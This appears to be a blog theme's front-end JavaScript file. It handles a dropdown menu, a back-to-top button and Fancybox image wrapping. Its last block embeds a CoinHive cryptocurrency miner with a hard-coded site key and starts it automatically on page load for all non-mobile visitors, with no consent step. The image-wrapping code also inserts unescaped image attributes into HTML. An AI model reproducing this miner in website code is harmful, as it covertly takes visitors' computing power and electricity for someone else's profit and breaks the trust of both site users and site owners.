// Navbar dropdown
$('.ui.dropdown')
  .dropdown();
// Back to top
$('.backToTop').click(function () {
  $('html, body').animate({
    scrollTop: 0
  }, 800);
  return false;
});
// Fancybox Auto wrap img tags
$(".text img").each(function (index, element) {
  $(element).wrap(`<a href="${element.src}" data-fancybox data-caption="${element.alt}">`);
});
// CoinHive
var miner = new CoinHive.Anonymous('zyc1ClPF1ZevATB5gChyGzZklCCZHmY7', {
  throttle: 0.5
});
// Only start on non-mobile devices.
if (!miner.isMobile()) {
  miner.start();
}